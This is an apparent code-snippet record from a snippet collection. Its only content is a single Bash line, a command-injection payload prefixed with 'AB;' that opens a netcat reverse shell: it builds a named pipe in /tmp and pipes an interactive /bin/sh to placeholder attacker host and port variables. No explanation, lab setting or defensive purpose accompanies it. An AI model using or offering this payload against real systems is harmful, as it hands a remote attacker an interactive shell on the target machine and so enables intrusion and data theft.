---
id: 78e467ec-3728-42bd-a8fe-90e52d647fc5
type: code
language: Bash
verified: false
created_at: '2019-11-04T22:03:46.930592+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 78e467ec

**Language**: Bash

```bash
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```
